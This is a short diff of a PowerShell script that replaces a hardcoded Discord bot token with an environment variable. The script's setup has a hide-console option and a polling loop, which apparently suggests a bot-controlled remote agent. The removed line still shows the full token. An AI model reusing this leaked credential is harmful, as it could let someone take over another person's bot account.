@@ -1,6 +1,6 @@
 
 # =====================================================================================================================================================
-$global:token = "MTQ3MzkwMjk2NjA1MzUzNTc5NA.GVBRI2.kOAks2eLZWUxam0ttKDrm8W4tKSPlbhrpecZyg" # make sure your bot is in ONE server only
+$global:token = $env:BOT_TOKEN # make sure your bot is in ONE server only
 # =============================================================== SCRIPT SETUP =========================================================================
 
 $HideConsole = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
@@ -1896,6 +1896,7 @@ while ($true) {
     }
     Sleep 3
 }
+
 
 
 
